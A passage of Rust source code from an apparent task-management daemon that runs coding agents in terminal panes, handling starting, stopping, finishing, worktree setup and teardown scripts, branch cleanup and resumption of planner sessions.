        let row = self.db.task(id).map_err(failed)?.ok_or_else(|| KmuxError::new("not_found", format!("no task \"{reference}\"")))?;
        let entry = Entry::from_row(&row);
        let mut task = entry.to_value();
        task["short"] = json!(self.short(id));
        task["place"] = json!(row.place.as_str());
        task["pane"] = opt(row.terminal.as_deref());
        if row.place == Place::Done {
            let events = self.db.events(id).unwrap_or_default();
            let done = events.iter().rev().find(|e| e.what == "done");
            task["doneAt"] = done.map_or(Value::Null, |e| num(e.at));
            let branch = done.and_then(|e| string(&e.doc, "branch").map(String::from)).or_else(|| entry.folder.as_deref().and_then(branch_of));
            let kept = branch.filter(|b| git(Path::new(&row.repo), &["rev-parse", "--verify", "--quiet", &format!("refs/heads/{b}")]).is_ok());
            task["branch"] = opt(kept.as_deref());
        } else {
            task["branch"] = opt(entry.folder.as_deref().and_then(branch_of).as_deref());
        }
        Ok(Map::from_iter([("task".to_string(), task)]))
    }

    fn closing(&self, task: &str) {
        if let Some(on_close) = self.on_close.borrow().as_ref() {
            on_close(task);
        }
    }

    fn take(&self, id: &str) -> Option<Entry> {
        let mut entries = self.entries.borrow_mut();
        let at = entries.iter().position(|e| e.id == id)?;
        Some(entries.remove(at))
    }

    /// Ends a task: runs its repo's teardown in its agent's pane first, and it's Done once that succeeds.
    fn done(self: &Rc<Self>, args: &Value, responder: Responder) {
        let Some(core) = self.core.upgrade() else { return responder.reply(Err(gone())) };
        let Some(reference) = string(args, "task") else { return responder.reply(Err(bad("say which task"))) };
        let by = who(args).map(String::from);
        let waiting = self.entries.borrow().iter().find(|e| e.id == reference).cloned();
        let (entry, pane) = match &waiting {
            Some(entry) => (Some(entry.clone()), entry.held.clone().filter(|pane| core.pane(pane).is_some())),
            None => {
                let Some(pane) = core.pane(&self.pane_or(reference)).map(|p| p.id) else { return responder.reply(Err(not_found(reference))) };
                (self.running.borrow().iter().find(|r| r.pane == pane).map(|r| r.entry.clone()), Some(pane))
            }
        };
        if let Some(entry) = &entry {
            if pane.as_ref().is_some_and(|pane| self.tearing_down.borrow().contains_key(pane)) {
                return responder.reply(Err(KmuxError::new("tearing_down", format!("{}'s teardown is running: it's done when that succeeds", self.short(&entry.id)))));
            }
            self.closing(&entry.id);
        }
        if let Some(pane) = pane.clone().filter(|pane| alive(&core, pane)) {
            let agent = entry.as_ref().map_or_else(|| core.pane(&pane).and_then(|p| p.command).unwrap_or_default(), |e| e.agent.clone());
            let (this, args) = (Rc::downgrade(self), args.clone());
            return self.end_agent(&pane.clone(), &agent, move |session| {
                let Some(this) = this.upgrade() else { return responder.reply(Err(gone())) };
                this.keep_session(&pane, session);
                this.done(&args, responder)
            });
        }
        if let Some(entry) = &entry {
            if args.get("keep").and_then(Value::as_bool) == Some(true) {
                self.keeping.borrow_mut().insert(entry.id.clone());
            } else if let Some(pane) = &pane {
                if let Some(tearing) = self.teardown_of(entry, waiting.is_some(), by.clone()) {
                    return self.tear_down(pane, tearing, responder);
                }
            }
        }
        match (waiting, pane) {
            (Some(entry), _) => self.take_off(entry, by, Answer::To(responder)),
            (None, Some(pane)) => {
                self.ending.borrow_mut().insert(pane.clone(), by);
                let this = Rc::downgrade(self);
                let closing = pane.clone();
                core.handle(json!({ "cmd": "close", "args": { "task": pane } }), move |reply| match failed(&reply) {
                    Some(error) => {
                        if let Some(this) = this.upgrade() {
                            this.ending.borrow_mut().remove(&closing);
                        }
                        responder.reply(Err(error))
                    }
                    None => responder.reply(Ok(reply.as_object().cloned().map(|mut r| {
                        r.remove("ok");
                        r
                    }).unwrap_or_default())),
                })
            }
            (None, None) => responder.reply(Err(not_found(reference))),
        }
    }

    /// Takes a task off the Shelf, ending its agent and tabs if it was moved there still running.
    fn take_off(self: &Rc<Self>, entry: Entry, by: Option<String>, responder: Answer) {
        if let Err(error) = self.store(&entry, Place::Done, None, Some(Change::new("done").moved(Place::Shelf, Place::Done).by(by.as_deref()).with("branch", opt(entry.folder.as_deref().and_then(branch_of).as_deref())))) {
            return responder.reply(Err(error));
        }
        self.tell_planner(&entry, What::Ended { on_desk: false }, by.as_deref());
        let short = self.short(&entry.id);
        self.take(&entry.id);
        if let Some(pane) = &entry.held {
            self.turns.borrow_mut().remove(pane);
            self.quitting.borrow_mut().remove(pane);
        }
        self.changed();
        self.refill();
        let mut task = entry.to_value();
        task["short"] = json!(short);
        let value = Map::from_iter([("task".to_string(), task)]);
        match (entry.held.clone(), self.core.upgrade()) {
            (Some(pane), Some(core)) if core.pane(&pane).is_some() => {
                self.setting_up.borrow_mut().remove(&pane);
                let this = Rc::downgrade(self);
                core.handle(json!({ "cmd": "close", "args": { "task": pane } }), move |_| {
                    if let Some(this) = this.upgrade() {
                        this.finish(&entry);
                    }
                    responder.reply(Ok(value))
                })
            }
            _ => {
                self.finish(&entry);
                responder.reply(Ok(value))
            }
        }
    }

    fn teardown_of(&self, entry: &Entry, on_shelf: bool, by: Option<String>) -> Option<TearingDown> {
        let worktree = entry.folder.clone().map(PathBuf::from).filter(|f| f.is_dir() && task_scripts::is_linked(f))?;
        let scripts = scripts(&config_files(Path::new(&entry.repo)));
        scripts.teardown.as_ref()?;
        Some(TearingDown { entry: entry.clone(), worktree, timeout: scripts.timeout, on_shelf, by })
    }

    fn tear_down(self: &Rc<Self>, pane: &str, tearing: TearingDown, responder: Responder) {
        let Some(core) = self.core.upgrade() else { return responder.reply(Err(gone())) };
        let scripts = scripts(&config_files(Path::new(&tearing.entry.repo)));
        let task = Self::script_task(&tearing.entry, &tearing.worktree);
        let Some(command) = scripts.teardown.as_deref().and_then(|teardown| task.teardown_command(teardown, scripts.timeout)) else {
            return responder.reply(Err(bad(format!("{} isn't a worktree", tearing.worktree.display()))));
        };
        task_scripts::forget_teardown(&tearing.worktree);
        let id = self.short(&tearing.entry.id);
        log!("kanna-daemon: {} is done, so its teardown runs in {pane}: {}", tearing.entry.id, scripts.teardown.as_deref().unwrap_or(""));
        self.note(pane, Change::new("tearing down").by(tearing.by.as_deref()));
        self.turns.borrow_mut().remove(pane);
        self.quitting.borrow_mut().remove(pane);
        self.setting_up.borrow_mut().remove(pane);
        self.stopping.borrow_mut().insert(pane.to_string());
        let (this, weak, pane) = (Rc::downgrade(self), core.weak(), pane.to_string());
        core.handle(json!({ "cmd": "close", "args": { "task": pane, "tabs": true } }), move |_| {
            let Some(core) = weak.upgrade() else { return responder.reply(Err(gone())) };
            let again = core.weak();
            core.end(&pane.clone(), move |_| {
                let (Some(this), Some(core)) = (this.upgrade(), again.upgrade()) else { return responder.reply(Err(gone())) };
                this.stopping.borrow_mut().remove(&pane);
                let task = tearing.entry.id.clone();
                this.tearing_down.borrow_mut().insert(pane.clone(), tearing);
                this.changed();
                core.set_command(&pane, command);
                let after = Rc::downgrade(&this);
                core.handle(json!({ "cmd": "restart", "args": { "pane": pane } }), move |reply| {
                    let Some(error) = failed(&reply) else {
                        let pane = reply.get("pane").and_then(|p| string(p, "id")).unwrap_or(&pane);
                        return responder.reply(Ok(Map::from_iter([("task".to_string(), json!(id)), ("pane".to_string(), json!(pane)), ("teardown".to_string(), json!(true))])));
                    };
                    log!("kanna-daemon: couldn't run {task}'s teardown: {}", error.message);
                    if let Some(this) = after.upgrade() {
                        let held = this.tearing_down.borrow().iter().find(|(_, t)| t.entry.id == task).map(|(pane, _)| pane.clone());
                        if let Some(tearing) = held.as_ref().and_then(|held| this.tearing_down.borrow_mut().remove(held)) {
                            this.torn_down(held.as_deref().unwrap_or(&pane), tearing, 127);
                        }
                    }
                    responder.reply(Err(error));
                });
            });
        });
    }

    fn torn_down(self: &Rc<Self>, pane: &str, tearing: TearingDown, code: i32) {
        let code = task_scripts::torn_down(&tearing.worktree).unwrap_or(code);
        let id = tearing.entry.id.clone();
        log!("kanna-daemon: {id}'s teardown exited {code}");
        self.note(pane, Change::new("torn down").by(Some("daemon")).with("code", json!(code)));
        self.changed();
        let Some(core) = self.core.upgrade() else { return };
        if code != 0 {
            let said = task_scripts::said("teardown", code, tearing.timeout);
            log!("kanna-daemon: {id}'s {said}, so it isn't done: its pane shows why");
            self.note(pane, Change::new("teardown failed").by(Some("daemon")).with("code", json!(code)).with("why", json!(said)));
            core.set_command(pane, tearing.entry.clone().resumable().command(None));
            return;
        }
        if !tearing.on_shelf {
            self.ending.borrow_mut().insert(pane.to_string(), tearing.by);
            return core.handle(json!({ "cmd": "close", "args": { "task": pane } }), |_| {});
        }
        let Some(entry) = self.entries.borrow().iter().find(|e| e.id == id).cloned() else { return };
        self.take_off(entry, tearing.by, Answer::Then(Box::new(|_| {})));
    }

    fn plan(&self, args: &Value, responder: Responder) {
        let Some(core) = self.core.upgrade() else { return responder.reply(Err(KmuxError::new("app_gone", "the daemon is stopping"))) };
        let claimant = self.claimant.borrow().clone();
        let app = string(args, "app").unwrap_or(&claimant);
        let home = std::env::var("HOME").unwrap_or_else(|_| "/".into());
        let folder = string(args, "folder").filter(|f| Path::new(f).is_absolute() && Path::new(f).is_dir()).unwrap_or(&home);
        let zsh = Some(self.state.join("shell/zsh")).filter(|dir| dir.join(".zshenv").is_file());
        let beside = std::env::current_exe().ok().and_then(|exe| exe.parent().map(|dir| dir.join("planner.sh"))).filter(|s| s.is_file());
        let script = string(args, "script").filter(|s| Path::new(s).is_file()).or(beside.as_deref().and_then(Path::to_str));
        let repos = crate::agents::home().join(".kanna-v4/repos");
        let context = planning_context(&config_files(Path::new(folder)));
        let cmd = planner_command(script, context, zsh.as_deref().and_then(Path::to_str), cli().as_deref().and_then(Path::to_str), &repos, &planner_agents(context));
        let open = json!({ "type": "term", "planner": true, "claim": app, "cwd": folder, "cmd": cmd, "wait": false });
        core.handle(json!({ "cmd": "open", "args": open }), move |reply| match failed(&reply) {
            Some(error) => responder.reply(Err(error)),
            None => responder.reply(Ok(Map::from_iter([("pane".to_string(), reply.get("pane").and_then(|p| p.get("id")).cloned().unwrap_or(Value::Null)), ("workspace".to_string(), reply.get("workspace").and_then(|w| w.get("id")).cloned().unwrap_or(Value::Null))]))),
        });
    }

    fn planner(self: &Rc<Self>, args: &Value, responder: Responder) {
        match string(args, "step") {
            Some("start") => responder.reply(self.planner_starts(args)),
            Some("quit") => self.planner_quit(args, responder),
            _ => responder.reply(Err(bad("planner needs a step: start or quit"))),
        }
    }

    fn planner_in(args: &Value) -> Result<(String, PathBuf, Option<u64>), KmuxError> {
        let pane = string(args, "pane").filter(|p| !p.is_empty()).ok_or_else(|| bad("say which planning terminal"))?;
        let folder = string(args, "folder").map(Path::new).filter(|f| f.is_absolute() && f.is_dir()).ok_or_else(|| bad("say the planning terminal's folder"))?;
        let context = planning_context(&config_files(folder));
        let project = project(folder.to_str()).unwrap_or_else(|| folder.to_path_buf());
        Ok((pane.to_string(), project, context))
    }

    fn planner_starts(&self, args: &Value) -> Result<Map, KmuxError> {
        let (pane, project, context) = Self::planner_in(args)?;
        let prompts = prompts(&config_files(&project));
        let name = string(args, "agent").ok_or_else(|| bad("say which agent"))?;
        let program = planner_program(name, context).ok_or_else(|| bad(format!("{name} isn't an agent a planning terminal starts")))?;
        let key = project.to_string_lossy().to_string();
        let kept = self.db.planner(&key).ok().flatten();
        let core = self.core.upgrade();
        let live = |other: &str| core.as_ref().is_some_and(|core| alive(core, other));
        let back = comeback(kept.as_ref(), name, &pane, live, |since| first_session_since(&program, &project, since));
        let label = project.file_name().map_or_else(|| key.clone(), |n| n.to_string_lossy().to_string());
        let group = string(args, "group").filter(|g| !g.is_empty() && g.bytes().all(|b| b.is_ascii_digit()));
        let after = kept.as_ref().and_then(|k| string(k, "group")).filter(|before| Some(*before) != group).filter(|_| matches!(back, Comeback::Resume(_))).map(String::from);
        let (command, session, said) = match back {
            Comeback::Resume(session) => (resumed_as(&program, context, prompts, &session), Some(session), format!("Back to {label}'s planning conversation.")),
            back => {
                let new = agent(&program).and_then(|a| a.named).and_then(|_| uuid().ok());
                let said = match back {
                    Comeback::Busy => format!("The planner in another window is in {label}'s planning conversation, so this one starts a new one."),
                    Comeback::Lost => format!("{name} didn't leave a conversation Kanna can find for {label}, so this one starts a new one."),
                    _ => String::new(),
                };
                (started_in(&program, PLANNER_ROLE, context, prompts, new.as_deref()), new, said)
            }
        };
        log!("kanna-daemon: the planner in {pane} starts {name} on {key}{}", session.as_deref().map_or(String::new(), |s| format!(" in session {s}")));
        let doc = json!({ "agent": name, "session": opt(session.as_deref()), "started": num(now()), "pane": pane, "group": opt(group), "running": true });
        if let Err(error) = self.db.put_planner(&key, &doc) {
            log!("kanna-daemon: can't keep {key}'s planner: {error}");
        }
        Ok(Map::from_iter([("command".to_string(), json!(command)), ("said".to_string(), json!(said)), ("after".to_string(), opt(after.as_deref())), ("project".to_string(), json!(key))]))
    }

    fn planner_quit(self: &Rc<Self>, args: &Value, responder: Responder) {
        let (pane, project, context) = match Self::planner_in(args) {
            Ok(found) => found,
            Err(error) => return responder.reply(Err(error)),
        };
        let prompts = prompts(&config_files(&project));
        let key = project.to_string_lossy().to_string();
        let Some(kept) = self.db.planner(&key).ok().flatten().filter(|k| string(k, "pane") == Some(pane.as_str())) else { return responder.reply(Ok(Map::new())) };
        let name = string(&kept, "agent").unwrap_or_default().to_string();
        let Some(program) = planner_program(&name, context) else { return responder.reply(Ok(Map::new())) };
        let Some(core) = self.core.upgrade() else { return responder.reply(Err(gone())) };
        let this = Rc::downgrade(self);
        core.handle(json!({ "cmd": "read", "args": { "pane": pane } }), move |reply| {
            let Some(this) = this.upgrade() else { return responder.reply(Err(gone())) };
            let text = string(&reply, "text").unwrap_or_default();
            let said = kanna_detect::program::known_agent(self::program(&program)).and_then(Quit::of).and_then(|q| q.session_in(text));
            let started = kept.get("started").and_then(Value::as_f64).map(|at| UNIX_EPOCH + Duration::from_secs_f64(at));
            let session = said.or_else(|| string(&kept, "session").map(String::from)).or_else(|| started.and_then(|since| first_session_since(&program, &project, since)));
            let mut doc = kept.clone();
            doc["session"] = opt(session.as_deref());
            doc["running"] = json!(false);
            if let Err(error) = this.db.put_planner(&key, &doc) {
                log!("kanna-daemon: can't keep {key}'s planner: {error}");
            }
            let again = session.map(|session| resumed_as(&program, context, prompts, &session));
            responder.reply(Ok(Map::from_iter([("again".to_string(), opt(again.as_deref()))])))
        });
    }

    fn pick(self: &Rc<Self>, args: &Value, responder: Responder) {
        let Some(id) = string(args, "task") else { return responder.reply(Err(bad("say which task"))) };
        let Some(entry) = self.entries.borrow().iter().find(|e| e.id == id).cloned() else { return responder.reply(Err(not_found(id))) };
        if self.pending.borrow().values().any(|p| p.entry.id == entry.id) {
            return responder.reply(Err(bad(format!("{id} is starting"))));
        }
        if let Err(error) = self.startable(&entry) {
            return responder.reply(Err(error));
        }
        let app = string(args, "app").map_or_else(|| self.claimant.borrow().clone(), String::from);
        self.room(entry, app, who(args).map(String::from), Answer::To(responder));
    }

    fn start(self: &Rc<Self>, args: &Value, responder: Responder) {
        let Some(core) = self.core.upgrade() else { return responder.reply(Err(gone())) };
        let Some(reference) = string(args, "task") else { return responder.reply(Err(bad("say which task"))) };
        let by = who(args).map(String::from);
        let found = self.entries.borrow().iter().find(|e| e.id == reference).cloned();
        if let Some(entry) = found {
            if self.pending.borrow().values().any(|p| p.entry.id == entry.id) {
                return responder.reply(Err(bad(format!("{reference} is starting"))));
            }
            if let Err(error) = self.startable(&entry) {
                return responder.reply(Err(error));
            }
            let id = entry.id.clone();
            let this = Rc::downgrade(self);
            return match entry.held.clone().filter(|pane| core.pane(pane).is_some()) {
                Some(pane) if alive(&core, &pane) => responder.reply(Err(running(&id))),
                Some(pane) => self.revive(&pane, Some(self.again(&entry)), move |result| {
                    if let (Ok(pane), Some(this)) = (&result, this.upgrade()) {
                        this.restarted(pane);
                        this.note(pane, Change::new("started").by(by.as_deref()));
                    }
                    responder.reply(result.map(|pane| started_here(&id, &pane, Place::Shelf.as_str())))
                }),
                None => self.prepare(Entry { held: None, ..entry }, None, by, Answer::To(responder)),
            };
        }
        let this = Rc::downgrade(self);
        self.task_pane(&self.pane_or(reference), move |found| {
            let Some(this) = this.upgrade() else { return };
            let pane = match found {
                Ok(pane) => pane,
                Err(error) => return responder.reply(Err(error)),
            };
            if this.core.upgrade().is_some_and(|core| alive(&core, &pane)) {
                return responder.reply(Err(running(&pane)));
            }
            let entry = this.running.borrow().iter().find(|r| r.pane == pane).map(|r| r.entry.clone());
            if let Some(Err(error)) = entry.as_ref().map(|e| this.placed(&e.repo)) {
                return responder.reply(Err(error));
            }
            let id = entry.as_ref().map_or_else(|| pane.clone(), |e| e.id.clone());
            let again = Rc::downgrade(&this);
            let command = entry.map(|e| this.again(&e));
            this.revive(&pane.clone(), command, move |result| {
                if let (Ok(pane), Some(this)) = (&result, again.upgrade()) {
                    this.note(pane, Change::new("started").by(by.as_deref()));
                }
                responder.reply(result.map(|pane| started_here(&id, &pane, Place::Desk.as_str())))
            });
        });
    }

    fn stop(self: &Rc<Self>, args: &Value, responder: Responder) {
        let Some(reference) = string(args, "task") else { return responder.reply(Err(bad("say which task"))) };
        let found = self.entries.borrow().iter().find(|e| e.id == reference).cloned();
        let by = who(args).map(String::from);
        let this = Rc::downgrade(self);
        let end = move |task: String, pane: String, place: &'static str, responder: Responder| {
            let Some(this) = this.upgrade() else { return responder.reply(Err(gone())) };
            let Some(core) = this.core.upgrade() else { return responder.reply(Err(gone())) };
            if !alive(&core, &pane) {
                return responder.reply(Err(KmuxError::new("stopped", format!("{task} is stopped: start it with `kanna task start {task}`"))));
            }
            let (weak, tasks) = (core.weak(), Rc::downgrade(&this));
            let agent = this.pane_entry(&pane).map_or_else(|| core.pane(&pane).and_then(|p| p.command).unwrap_or_default(), |e| e.agent);
            this.end_agent(&pane.clone(), &agent, move |session| {
                let (Some(tasks), Some(core)) = (tasks.upgrade(), weak.upgrade()) else { return responder.reply(Err(gone())) };
                tasks.keep_session(&pane, session);
                let session = tasks.pane_entry(&pane).and_then(|e| e.session);
                tasks.note(&pane, Change::new("stopped").by(by.as_deref()).with("session", opt(session.as_deref())));
                tasks.refill();
                let out = Map::from_iter([("task".to_string(), json!(task)), ("pane".to_string(), json!(pane)), ("place".to_string(), json!(place))]);
                core.hang_up(&pane.clone(), move |hung_up| responder.reply(hung_up.map(|_| out)));
            });
        };
        if let Some(entry) = found {
            let pane = entry.held.clone().filter(|pane| self.core.upgrade().is_some_and(|core| core.pane(pane).is_some()));
            return match pane {
                Some(pane) => end(entry.id, pane, Place::Shelf.as_str(), responder),
                None => responder.reply(Err(KmuxError::new("stopped", format!("{} is stopped: start it with `kanna task start {}`", entry.id, entry.id)))),
            };
        }
        let task = self.is_open(reference).then(|| reference.to_string());
        self.task_pane(&self.pane_or(reference), move |found| match found {
            Ok(pane) => end(task.unwrap_or_else(|| pane.clone()), pane, Place::Desk.as_str(), responder),
            Err(error) => responder.reply(Err(error)),
        });
    }

    fn restarted(&self, pane: &str) {
        self.turns.borrow_mut().insert(pane.to_string(), Turn::default());
        let Some(mut entry) = self.entries.borrow().iter().find(|e| e.held.as_deref() == Some(pane)).cloned() else { return };
        if entry.stopped.take().is_some() {
            let _ = self.store(&entry, Place::Shelf, Some(pane), None);
            if let Some(found) = self.entries.borrow_mut().iter_mut().find(|e| e.id == entry.id) {
                *found = entry;
            }
        }
        self.changed();
    }

    fn task_pane(&self, reference: &str, then: impl FnOnce(Result<String, KmuxError>) + 'static) {
        let Some(core) = self.core.upgrade() else { return then(Err(gone())) };
        let Some(pane) = core.pane(reference).map(|p| p.id) else { return then(Err(KmuxError::new("not_found", format!("no task \"{reference}\"")))) };
        let reference = reference.to_string();
        core.handle(json!({ "cmd": "task", "args": { "action": "list" } }), move |reply| {
            if let Some(error) = failed(&reply) {
                return then(Err(error));
            }
            let listed = reply.get("tasks").and_then(Value::as_array).is_some_and(|tasks| tasks.iter().any(|t| string(t, "id") == Some(pane.as_str())));
            then(if listed { Ok(pane) } else { Err(KmuxError::new("not_a_task", format!("{reference} isn't a task: a task is an agent docked on a Desk, or on the Shelf"))) })
        });
    }

    fn revive(&self, pane: &str, command: Option<String>, done: impl FnOnce(Result<String, KmuxError>) + 'static) {
        let Some(core) = self.core.upgrade() else { return done(Err(gone())) };
        if let Some(command) = command {
            core.set_command(pane, command);
        }
        let (weak, old) = (core.weak(), pane.to_string());
        core.handle(json!({ "cmd": "restart", "args": { "pane": pane } }), move |reply| {
            if let Some(error) = failed(&reply) {
                return done(Err(error));
            }
            let task = reply.get("pane").and_then(|p| string(p, "id")).map_or(old, str::to_string);
            let Some(core) = weak.upgrade() else { return done(Ok(task)) };
            core.wake(&task.clone(), move |woken| {
                if let Err(error) = woken {
                    log!("kanna-daemon: couldn't start {task}'s terminals again: {}", error.message);
                }
                done(Ok(task))
            });
        });
    }

    fn script_task(entry: &Entry, folder: &Path) -> task_scripts::Task {
        task_scripts::Task { id: entry.id.clone(), name: entry.name.clone(), repo: PathBuf::from(&entry.repo), worktree: folder.to_path_buf() }
    }

    fn setup_first(&self, entry: &Entry, folder: &Path, then: &str) -> Option<(String, SettingUp)> {
        let scripts = scripts(&config_files(Path::new(&entry.repo)));
        let setup = scripts.setup.filter(|_| task_scripts::needs_setup(folder))?;
        let command = Self::script_task(entry, folder).setup_command(&setup, scripts.timeout, Some(then))?;
        log!("kanna-daemon: {}'s setup runs in {} before its agent: {setup}", entry.id, folder.display());
        Some((command, SettingUp { worktree: folder.to_path_buf(), timeout: scripts.timeout }))
    }

    fn first_command(entry: &Entry) -> String {
        Entry { session: None, folder: None, ..entry.clone() }.command(entry.session.as_deref())
    }

    fn again(&self, entry: &Entry) -> String {
        let folder = entry.folder.as_deref().map(Path::new);
        if let Some(folder) = folder {
            task_scripts::forget_teardown(folder);
        }
        match folder.and_then(task_scripts::setup) {
            Some(Setup::Failed(code)) => {
                task_scripts::started_anyway(folder.unwrap_or(Path::new("")), code);
                log!("kanna-daemon: {}'s setup failed (exit {code}), and its agent starts anyway", entry.id);
                Self::first_command(entry)
            }
            _ => entry.clone().resumable().command(None),
        }
    }

    fn set_up(&self, pane: &str, setting: &SettingUp) {
        let task = self.task_of(pane).unwrap_or_else(|| pane.to_string());
        match task_scripts::setup(&setting.worktree) {
            Some(Setup::Done) => {
                log!("kanna-daemon: {task} is set up, so its agent starts");
                self.note(pane, Change::new("set up").by(Some("daemon")).with("code", json!(0)));
            }
            Some(Setup::Failed(code)) => {
                let said = task_scripts::said("setup", code, setting.timeout);
                log!("kanna-daemon: {task}'s {said}, so it stops");
                self.note(pane, Change::new("setup failed").by(Some("daemon")).with("code", json!(code)).with("why", json!(said)));
            }
            _ => {}
        }
        self.changed();
    }

    fn script_said(&self, entry: &Entry, pane: Option<&str>, running: bool) -> Option<String> {
        if pane.is_some_and(|pane| self.setting_up.borrow().contains_key(pane)) {
            return Some("setting up".into());
        }
        if pane.is_some_and(|pane| self.tearing_down.borrow().contains_key(pane)) {
            return Some("tearing down".into());
        }
        let folder = Path::new(entry.folder.as_deref().filter(|_| !running)?);
        let timeout = || scripts(&config_files(Path::new(&entry.repo))).timeout;
        if let Some(code) = task_scripts::torn_down(folder).filter(|code| *code != 0) {
            return Some(task_scripts::said("teardown", code, timeout()));
        }
        match task_scripts::setup(folder)? {
            Setup::Failed(code) => Some(task_scripts::said("setup", code, timeout())),
            _ => None,
        }
    }

    fn finish(&self, entry: &Entry) {
        let keep = self.keeping.borrow_mut().remove(&entry.id);
        let Some(folder) = entry.folder.clone().map(PathBuf::from).filter(|f| f.is_dir()) else { return self.merged(&entry.id, Merge::Unknown) };
        if !task_scripts::is_linked(&folder) {
            return self.merged(&entry.id, Merge::Unknown);
        }
        let judge = {
            let (events, id, repo, folder) = (self.events.clone(), entry.id.clone(), PathBuf::from(&entry.repo), folder.clone());
            move || {
                let merge = task_scripts::merge(&repo, &folder);
                let _ = events.send(Event::Merged { task: id, merge });
            }
        };
        let id = entry.id.clone();
        let kept = |why: String| {
            log!("kanna-daemon: kept {id}'s worktree {} and its branch: {why}", folder.display());
            Change::new("kept").by(Some("daemon")).with("why", json!(why))
        };
        if keep {
            std::thread::spawn(judge);
            return self.finished(&id, vec![kept("kanna task done --keep".into())]);
        }
        let scripts = scripts(&config_files(Path::new(&entry.repo)));
        let teardown = match task_scripts::torn_down(&folder) {
            Some(0) => None,
            Some(code) => {
                std::thread::spawn(judge);
                return self.finished(&id, vec![kept(task_scripts::said("teardown", code, scripts.timeout))]);
            }
            None => scripts.teardown.clone(),
        };
        let task = Self::script_task(entry, &folder);
        let events = self.events.clone();
        std::thread::spawn(move || {
            judge();
            let id = task.id.clone();
            let mut changes = vec![];
            let ended = task_scripts::ended_at(&folder);
            let ended_at = |change: Change| match &ended {
                Some((branch, tip)) => change.with("branch", json!(branch)).with("tip", json!(tip)),
                None => change,
            };
            if let Some(teardown) = &teardown {
                log!("kanna-daemon: {id} is done with no pane to tear down in, so its teardown runs in {}: {teardown}", folder.display());
                let code = task_scripts::run(teardown, &folder, &task.vars(&task.branch()), Duration::from_secs(scripts.timeout)).unwrap_or_else(|error| {
                    log!("kanna-daemon: {id}'s teardown: {error}");
                    127
                });
                log!("kanna-daemon: {id}'s teardown exited {code}");
                changes.push(Change::new("torn down").by(Some("daemon")).with("code", json!(code)));
                if code != 0 {
                    let why = task_scripts::said("teardown", code, scripts.timeout);
                    log!("kanna-daemon: kept {id}'s worktree {} and its branch: {why}", folder.display());
                    changes.push(ended_at(Change::new("kept").by(Some("daemon")).with("why", json!(why))));
                    let _ = events.send(Event::Finished { task: id, changes });
                    return;
                }
            }
            match task_scripts::clean_up(&task.repo, &folder) {
                Cleanup::Removed { branch } => {
                    log!("kanna-daemon: {id} is merged, so its worktree {} and branch {branch} are removed", folder.display());
                    changes.push(ended_at(Change::new("cleaned up").by(Some("daemon")).with("worktree", json!(folder.to_string_lossy()))).with("branch", json!(branch)));
                }
                Cleanup::Kept(why) => {
                    log!("kanna-daemon: kept {id}'s worktree {} and its branch: {why}", folder.display());
                    changes.push(ended_at(Change::new("kept").by(Some("daemon")).with("why", json!(why))));
                }
            }
            let _ = events.send(Event::Finished { task: id, changes });
        });
    }

    pub fn merged(&self, task: &str, merge: Merge) {
        self.news.borrow_mut().merged(task, merge);
    }

    fn planner_of(&self, repo: &str, planners: &[String]) -> Option<String> {
        let core = self.core.upgrade()?;
        let repo = Path::new(repo);
        planners.iter().cloned().find(|pane| alive(&core, pane) && core.pane(pane).and_then(|p| project(p.cwd.as_deref())).is_some_and(|r| same_folder(&r, repo)))
    }

    fn tell_planner(&self, entry: &Entry, what: What, by: Option<&str>) {
        let planners = self.planners();
        if self.planner_of(&entry.repo, &planners).is_none() {
            return;
        }
        if by.is_some_and(|by| planners.iter().any(|p| p == by) && self.planner_of(&entry.repo, &[by.to_string()]).is_some()) {
            return;
        }
        let name = entry.name.clone().unwrap_or_else(|| self.short(&entry.id));
        self.news.borrow_mut().add(desk_news::Item::new(&entry.repo, &entry.id, &name, what, Instant::now()));
    }

    fn tell_planners(&self, now: Instant) -> Option<Instant> {
        let due = self.news.borrow_mut().due(now);
        if !due.is_empty() {
            let planners = self.planners();
            for (repo, text) in due {
                if self.planner_of(&repo, &planners).is_none() {
                    log!("kanna-daemon: no planner runs for {repo}, so its Desk news is dropped");
                    continue;
                }
                if let Err(error) = self.post(PLANNER, Some(&repo), desk_news::SENDER, &text) {
                    log!("kanna-daemon: couldn't tell {repo}'s planner about its Desk: {}", error.message);
                }
            }
        }
        self.news.borrow().next()
    }

    fn activated(&self, args: &Value) -> Result<Map, KmuxError> {
        let reference = string(args, "task").ok_or_else(|| bad("say which task"))?;
        let id = self.task_of(reference).unwrap_or_else(|| reference.to_string());
        let entry = self.running.borrow().iter().find(|r| r.entry.id == id).map(|r| r.entry.clone()).ok_or_else(|| not_found(reference))?;
        let by = who(args);
        if let Err(error) = self.db.log(&id, &Change::new("activated").by(by)) {
            log!("kanna-daemon: couldn't save {id}'s activated in {}: {error}", db::FILE);
        }
        self.tell_planner(&entry, What::Activated, by);
        Ok(Map::from_iter([("task".to_string(), json!(id))]))
    }

    pub fn finished(&self, task: &str, changes: Vec<Change>) {
        for change in changes {
            if let Err(error) = self.db.log(task, &change) {
                log!("kanna-daemon: couldn't save {task}'s {} in {}: {error}", change.what, db::FILE);
            }
        }
    }

    fn setup(self: &Rc<Self>, args: &Value, responder: Responder) {
        let Some(core) = self.core.upgrade() else { return responder.reply(Err(gone())) };
        let Some(reference) = string(args, "task") else { return responder.reply(Err(bad("say which task"))) };
        let held = self.entries.borrow().iter().find(|e| e.id == reference).cloned();
        let (entry, pane) = match held {
            Some(entry) => {
                let pane = entry.held.clone().filter(|pane| core.pane(pane).is_some());
                (entry, pane)
            }
            None => {
                let Some(pane) = core.pane(&self.pane_or(reference)).map(|p| p.id) else { return responder.reply(Err(not_found(reference))) };
                let Some(entry) = self.running.borrow().iter().find(|r| r.pane == pane).map(|r| r.entry.clone()) else {
                    return responder.reply(Err(KmuxError::new("not_a_task", format!("{reference} isn't a task Kanna started"))));
                };
                (entry, Some(pane))
            }
        };
        let id = self.short(&entry.id);
        let Some(folder) = entry.folder.clone().map(PathBuf::from).filter(|f| f.is_dir()) else {
            return responder.reply(Err(bad(format!("{id} has no worktree yet: `kanna task start {id}` makes one and sets it up"))));
        };
        let scripts = scripts(&config_files(Path::new(&entry.repo)));
        let Some(setup) = scripts.setup.clone() else {
            return responder.reply(Err(bad(format!("{} sets no tasks.setup (see `kanna config schema`)", entry.repo))));
        };
        let task = Self::script_task(&entry, &folder);
        let running = pane.as_deref().is_some_and(|pane| alive(&core, pane));
        if let (true, Some(pane)) = (running, pane.clone()) {
            task_scripts::forget_setup(&folder);
            let Some(command) = task.setup_command(&setup, scripts.timeout, None) else { return responder.reply(Err(bad(format!("{} isn't a worktree", folder.display())))) };
